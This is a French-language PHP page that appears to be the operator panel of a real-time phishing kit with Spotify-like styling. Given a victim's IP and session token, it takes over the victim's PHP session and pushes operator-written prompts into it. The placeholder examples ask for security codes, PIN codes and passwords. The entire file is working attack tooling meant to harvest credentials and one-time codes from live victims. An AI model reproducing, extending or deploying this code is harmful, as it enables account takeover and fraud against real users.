<?php
$ip = $_GET['ip'] ?? '';
$sessionToken = $_GET['token'] ?? '';

if (empty($ip) || empty($sessionToken)) {
    echo "Paramètres manquants.";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $title = trim($_POST['title'] ?? '');
    $message = trim($_POST['message'] ?? '');
    $fieldsJson = trim($_POST['fields'] ?? '[]');
    $fields = json_decode($fieldsJson, true);

    if (empty($title)) {
        $error = "Le titre est requis.";
    } else {
        if (empty($fields) || !is_array($fields)) {
            $fields = [['label' => 'Response', 'placeholder' => '', 'type' => 'text']];
        }

        session_id($sessionToken);
        session_start();
        $_SESSION['pending_redirect'] = 'custom';
        $_SESSION['custom_data'] = [
            'title' => $title,
            'message' => $message,
            'fields' => $fields,
        ];
        session_write_close();
        $success = true;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Custom Input</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
.container { max-width: 560px; width: 100%; background: #1e1e1e; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
h2 { margin-bottom: 5px; color: #1DB954; }
.subtitle { color: #999; margin-bottom: 25px; font-size: 14px; }
.ip-tag { background: #282828; padding: 4px 10px; border-radius: 20px; font-size: 12px; color: #1DB954; display: inline-block; margin-bottom: 20px; }
label { display: block; margin-bottom: 6px; color: #b3b3b3; font-size: 14px; }
input, textarea, select { width: 100%; padding: 12px; background: #282828; border: 1px solid #333; border-radius: 6px; color: #fff; font-size: 15px; margin-bottom: 14px; }
input:focus, textarea:focus, select:focus { outline: none; border-color: #1DB954; }
textarea { resize: vertical; min-height: 80px; }
button { width: 100%; padding: 14px; background: #1DB954; color: #000; border: none; border-radius: 30px; font-weight: 700; font-size: 16px; cursor: pointer; transition: background 0.3s; }
button:hover { background: #1ed760; }
.btn-add { background: #282828; color: #1DB954; border: 1px dashed #1DB954; border-radius: 8px; padding: 10px; font-size: 14px; margin-bottom: 18px; cursor: pointer; }
.btn-add:hover { background: #333; }
.btn-remove { background: #e91429; color: #fff; border: none; border-radius: 6px; padding: 6px 12px; font-size: 12px; cursor: pointer; float: right; margin-bottom: 6px; }
.field-block { background: #282828; border-radius: 8px; padding: 16px; margin-bottom: 14px; }
.field-block h4 { color: #ccc; margin-bottom: 10px; font-size: 13px; }
.error { background: rgba(233,20,41,0.1); border-left: 4px solid #e91429; color: #e91429; padding: 10px; border-radius: 4px; margin-bottom: 18px; font-size: 14px; }
.success { background: rgba(29,185,84,0.1); border: 1px solid rgba(29,185,84,0.3); color: #1DB954; padding: 15px; border-radius: 8px; text-align: center; font-weight: 500; }
.row { display: flex; gap: 10px; }
.row > * { flex: 1; }
</style>
</head>
<body>
<div class="container">
<?php if (isset($success) && $success): ?>
    <div class="success">
        ✅ Message envoyé à l'utilisateur.<br>
        <small style="color:#999;margin-top:10px;display:block">Vous pouvez fermer cette page.</small>
    </div>
<?php else: ?>
    <h2>Custom Input</h2>
    <p class="subtitle">Envoyer un message personnalisé à l'utilisateur</p>
    <div class="ip-tag">IP: <?php echo htmlspecialchars($ip); ?></div>

    <?php if (isset($error)): ?>
    <div class="error"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <form method="POST" id="customForm">
        <label for="title">Titre</label>
        <input type="text" id="title" name="title" placeholder="Ex: Vérification de sécurité" required>

        <label for="message">Message (optionnel)</label>
        <textarea id="message" name="message" placeholder="Ex: Veuillez entrer le code reçu..."></textarea>

        <h3 style="color:#b3b3b3;margin:18px 0 12px;font-size:14px;">Champs de saisie</h3>
        <div id="fieldsContainer"></div>
        <button type="button" class="btn-add" onclick="addField()">+ Ajouter un champ</button>

        <input type="hidden" name="fields" id="fieldsInput">
        <button type="submit">Envoyer</button>
    </form>

    <script>
    let fields = [{ label: '', placeholder: '', type: 'text' }];
    function render() {
        const c = document.getElementById('fieldsContainer');
        c.innerHTML = '';
        fields.forEach((f, i) => {
            c.innerHTML += '<div class="field-block"><h4>Champ '+(i+1)+(fields.length > 1 ? ' <button type="button" class="btn-remove" onclick="removeField('+i+')">×</button>' : '')+'</h4>'
                + '<div class="row"><div><label>Label</label><input type="text" value="'+f.label.replace(/"/g,'&quot;')+'" onchange="fields['+i+'].label=this.value" placeholder="Ex: Code PIN"></div>'
                + '<div><label>Type</label><select onchange="fields['+i+'].type=this.value">'
                + '<option value="text"'+(f.type==='text'?' selected':'')+'>Texte</option>'
                + '<option value="number"'+(f.type==='number'?' selected':'')+'>Nombre</option>'
                + '<option value="password"'+(f.type==='password'?' selected':'')+'>Mot de passe</option>'
                + '<option value="email"'+(f.type==='email'?' selected':'')+'>Email</option>'
                + '</select></div></div>'
                + '<label>Placeholder</label><input type="text" value="'+f.placeholder.replace(/"/g,'&quot;')+'" onchange="fields['+i+'].placeholder=this.value" placeholder="Ex: Entrez votre code...">'
                + '</div>';
        });
    }
    function addField() { fields.push({ label: '', placeholder: '', type: 'text' }); render(); }
    function removeField(i) { fields.splice(i, 1); render(); }
    render();
    document.getElementById('customForm').addEventListener('submit', function() {
        document.getElementById('fieldsInput').value = JSON.stringify(fields);
    });
    </script>
<?php endif; ?>
</div>
</body>
</html>
